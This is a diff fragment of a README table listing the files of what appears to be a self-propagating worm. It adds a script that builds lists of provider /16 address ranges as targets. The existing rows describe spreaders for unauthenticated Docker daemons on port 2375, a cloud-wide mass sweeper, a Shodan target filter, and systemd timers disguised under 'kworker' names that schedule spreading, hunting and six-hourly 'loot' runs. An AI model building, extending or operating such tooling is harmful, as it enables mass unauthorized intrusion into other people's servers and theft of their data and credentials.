@@ -27,6 +27,7 @@ Everything else is a small runnable reference implementation of it.
 | `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
 | `dockmass.sh` | Docker mass sweeper: cloud /16 space, thousands of addresses per run |
 | `shodan.sh` | Keyless Shodan DB filter: `:2375` -> dock, skip hosts with no way in |
+| `netbuild.sh` | Builds `nets.txt`: thousands of provider /16s, from keyless RIPE Stat |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
 | `kworker-hunt.service` / `.timer` | Hunt schedule |
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
